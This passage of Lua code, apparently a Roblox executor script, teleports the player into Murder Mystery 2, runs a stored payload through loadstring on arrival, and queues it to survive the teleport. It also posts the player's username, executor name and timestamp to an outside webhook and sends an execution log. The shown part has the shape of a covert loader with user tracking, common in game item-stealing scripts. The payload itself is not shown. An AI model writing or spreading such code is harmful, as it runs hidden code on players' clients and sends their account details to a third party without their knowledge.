    teleportState      = "TELEPORT_REQUESTED"
    webhookSent        = false
    queuedSuccessfully = false

    -- Already in MM2
    if game.PlaceId == TARGET_PLACE_ID then
        pcall(function()
            loadstring(SCRIPT_TO_RUN_ON_ARRIVAL)()
        end)

        local embed = {
            title = "V2 Successfully Teleported to MM2",
            color = 5763719,
            fields = {
                { name = "Game",              value = "Murder Mystery 2 (MM2)", inline = true },
                { name = "Status",            value = "✅ TELEPORTED",         inline = true },
                { name = "Roblox Username",   value = LocalPlayer.Name,        inline = true },
                { name = "Detected Executor", value = getExecutorName(),       inline = true },
                { name = "Destination",       value = "Place ID: `" .. TARGET_PLACE_ID .. "`", inline = false },
                { name = "Timestamp (UTC)",   value = getUTCTimestamp(),       inline = true },
            },
            footer = { text = "Roblox Teleport System • V2" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
        sendWebhook(SUCCESS_WEBHOOK_URL, embed)
        sendExecutionLog()
        return
    end

    queueArrivalPayload()
    sendExecutionLog()
    setupFailureListeners()

    local ok, err = pcall(function()
        TeleportService:Teleport(TARGET_PLACE_ID, LocalPlayer)
    end)

    if not ok then
        sendV3Failed(err)
    end
end

